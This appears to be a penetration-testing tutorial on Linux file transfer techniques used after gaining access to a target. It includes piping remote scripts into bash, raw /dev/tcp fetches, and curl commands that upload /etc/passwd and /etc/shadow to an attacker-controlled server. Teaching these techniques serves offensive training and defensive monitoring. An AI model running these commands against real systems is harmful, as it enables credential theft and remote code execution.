# Linux File Transfer Methods

Linux is a highly versatile operating system and typically includes a wide range of native tools that can be leveraged for file transfer operations. Understanding how file transfers work in Linux environments is valuable for both attackers and defenders, as it helps improve offensive capabilities while also informing defensive monitoring and prevention strategies.

During a past incident response engagement involving multiple compromised web servers, several threat actors were observed operating simultaneously across six out of nine systems. The attackers initially exploited a SQL injection vulnerability and deployed a Bash script that attempted to download additional malware components connecting back to a command-and-control (C2) server.

The Bash script implemented a simple but effective fallback mechanism:

1. Attempt download using `curl`
2. If that failed, attempt download using `wget`
3. If that failed, attempt download using Python

All three methods relied on HTTP-based communication. While Linux systems can communicate using protocols such as FTP or SMB (similar to Windows), the majority of malware across operating systems relies on HTTP and HTTPS due to their ubiquity and likelihood of being permitted through firewalls.

This section reviews multiple Linux file transfer techniques using commonly available tools and protocols, including HTTP, Bash, SSH, and others.

---

## Download Operations

Assume we have access to the Linux target machine `NIX04` and need to download a file from our Pwnbox. Below are several approaches to accomplish this using different transfer methods.

<img width="595" height="162" alt="LinuxDownloadUpload drawio" src="https://github.com/user-attachments/assets/623e1747-9b0d-45f6-9c53-a58a2684a3ae" />

---

## Base64 Encoding and Decoding

For smaller files, file transfers can be performed without direct network communication. If terminal access is available, files can be Base64-encoded, manually copied, and then decoded on the target system.

### Pwnbox – Check File MD5 Hash

```bash
md5sum id_rsa
```

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Pwnbox – Encode File to Base64

The file contents are printed using `cat` and piped into `base64`. The `-w 0` option ensures the output is written as a single line, making it easier to copy.

```bash
cat id_rsa | base64 -w 0; echo
```

The resulting Base64 string is copied and pasted onto the target Linux machine.

### Linux – Decode the File

```bash
echo -n '<BASE64_STRING>' | base64 -d > id_rsa
```

### Linux – Confirm MD5 Hash

```bash
md5sum id_rsa
```

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

> **Note:**
> The same technique can be used for uploads by encoding files on the compromised host and decoding them on the attack system.

---

## Web Downloads with `wget` and `curl`

Two of the most common utilities for interacting with web resources on Linux systems are `wget` and `curl`. These tools are available on most Linux distributions.

### Download Using `wget`

The `-O` option specifies the output file name.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Download Using `curl`

With `curl`, the output file option is lowercase `-o`.

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## Fileless Execution on Linux

Linux piping mechanisms make it easy to execute scripts directly in memory without writing them to disk.

> **Note:**
> Some payloads may still create temporary files depending on their behavior, even when executed via pipes.

### Fileless Execution with `curl`

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Execution with `wget`

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

```text
Hello World!
```

---

## Download Using Bash `/dev/tcp`

If common download utilities are unavailable, Bash can be used to retrieve files using `/dev/tcp`, provided Bash is version 2.04+ and compiled with network redirection support.

### Connect to Web Server

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

### Send HTTP GET Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

### Read Server Response

```bash
cat <&3
```

---

## SSH Downloads Using SCP

SSH provides secure remote access and includes `scp` for file transfers.

Before transferring files, ensure the SSH server is running on the Pwnbox.

### Enable SSH Service

```bash
sudo systemctl enable ssh
```

### Start SSH Service

```bash
sudo systemctl start ssh
```

### Verify SSH Listening Port

```bash
netstat -lnpt
```

```text
tcp   0   0 0.0.0.0:22   0.0.0.0:*   LISTEN
```

### Download Files Using SCP

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

> **Note:**
> It is recommended to create temporary user accounts for file transfers rather than using primary credentials.

---

## Upload Operations

In some scenarios, such as binary exploitation or packet capture analysis, files must be uploaded from the target system to the attack host. The same protocols used for downloads can often be reused for uploads.

---

## Web Uploads Using `uploadserver`

The `uploadserver` Python module extends the standard HTTP server with upload functionality and supports HTTPS.

### Install Upload Server

```bash
sudo python3 -m pip install --user uploadserver
```

### Create a Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Start HTTPS Upload Server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```text
File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443
```

### Upload Files from Target

```bash
curl -X POST https://192.168.49.128/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

The `--insecure` option is used because a self-signed certificate is trusted explicitly.

---

## Alternative Web Server Methods

If Python, PHP, or Ruby is installed, a lightweight web server can be quickly started to facilitate file transfers.

### Python 3 Web Server

```bash
python3 -m http.server
```

### Python 2.7 Web Server

```bash
python2.7 -m SimpleHTTPServer
```

### PHP Web Server

```bash
php -S 0.0.0.0:8000
```

### Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

### Download from Target Web Server

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

> **Note:**
> Inbound traffic may be blocked. This method downloads files from the compromised host rather than uploading to it.

---

## SCP Upload

If outbound SSH (TCP/22) is allowed, files can be uploaded to the target using SCP.

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

---

## Onwards

These are the most common file transfer methods using built-in Linux utilities. Additional techniques and tools will be explored in the following sections to further expand file transfer capabilities in restricted environments.
